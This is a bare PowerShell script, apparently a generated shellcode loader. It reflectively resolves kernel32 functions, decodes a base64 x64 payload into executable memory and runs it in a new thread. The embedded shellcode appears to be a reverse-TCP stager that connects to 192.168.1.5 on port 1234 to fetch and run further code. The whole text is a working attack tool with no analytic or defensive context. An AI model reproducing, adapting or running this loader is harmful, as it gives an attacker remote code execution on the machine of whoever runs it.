function bDGlX {
	Param ($oA, $hPh5)		
	$sr = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
	
	return $sr.GetMethod('GetProcAddress', [Type[]]@([System.Runtime.InteropServices.HandleRef], [String])).Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($sr.GetMethod('GetModuleHandle')).Invoke($null, @($oA)))), $hPh5))
}

function qlg {
	Param (
		[Parameter(Position = 0, Mandatory = $True)] [Type[]] $oSJ,
		[Parameter(Position = 1)] [Type] $twV = [Void]
	)
	
	$bQvWp = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
	$bQvWp.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $oSJ).SetImplementationFlags('Runtime, Managed')
	$bQvWp.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $twV, $oSJ).SetImplementationFlags('Runtime, Managed')
	
	return $bQvWp.CreateType()
}

[Byte[]]$sm5z3 = [System.Convert]::FromBase64String("/EiD5PDozAAAAEFRQVBSUVZIMdJlSItSYEiLUhhIi1IgSItyUEgPt0pKTTHJSDHArDxhfAIsIEHByQ1BAcHi7VJBUUiLUiCLQjxIAdBmgXgYCwIPhXIAAACLgIgAAABIhcB0Z0gB0FCLSBhEi0AgSQHQ41ZI/8lBizSISAHWTTHJSDHArEHByQ1BAcE44HXxTANMJAhFOdF12FhEi0AkSQHQZkGLDEhEi0AcSQHQQYsEiEgB0EFYQVheWVpBWEFZQVpIg+wgQVL/4FhBWVpIixLpS////11JvndzMl8zMgAAQVZJieZIgeygAQAASYnlSbwCAATSwKgBBUFUSYnkTInxQbpMdyYH/9VMiepoAQEAAFlBuimAawD/1WoKQV5QUE0xyU0xwEj/wEiJwkj/wEiJwUG66g/f4P/VSInHahBBWEyJ4kiJ+UG6maV0Yf/VhcB0Ckn/znXl6JMAAABIg+wQSIniTTHJagRBWEiJ+UG6AtnIX//Vg/gAflVIg8QgXon2akBBWWgAEAAAQVhIifJIMclBulikU+X/1UiJw0mJx00xyUmJ8EiJ2kiJ+UG6AtnIX//Vg/gAfShYQVdZaABAAABBWGoAWkG6Cy8PMP/VV1lBunVuTWH/1Un/zuk8////SAHDSCnGSIX2dbRB/+dYagBZScfC8LWiVv/V")
		
$xkx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((bDGlX kernel32.dll VirtualAlloc), (qlg @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, $sm5z3.Length,0x3000, 0x40)
[System.Runtime.InteropServices.Marshal]::Copy($sm5z3, 0, $xkx, $sm5z3.length)

$oqEO = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((bDGlX kernel32.dll CreateThread), (qlg @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero,0,$xkx,[IntPtr]::Zero,0,[IntPtr]::Zero)
[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((bDGlX kernel32.dll WaitForSingleObject), (qlg @([IntPtr], [Int32]))).Invoke($oqEO,0xffffffff) | Out-Null
